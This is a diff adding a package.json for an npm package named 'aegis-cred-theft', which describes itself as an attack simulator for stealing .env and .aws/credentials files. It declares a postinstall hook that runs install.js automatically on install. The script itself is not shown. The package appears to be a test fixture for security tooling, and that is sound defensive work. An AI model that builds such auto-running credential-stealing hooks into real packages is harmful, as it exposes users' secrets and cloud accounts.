@@ -1,0 +1,9 @@
+{
+  "name": "aegis-cred-theft",
+  "version": "1.0.0",
+  "description": "Aegis attack simulator — credential theft via .env and .aws/credentials exfiltration",
+  "scripts": {
+    "postinstall": "node install.js"
+  },
+  "license": "MIT"
+}
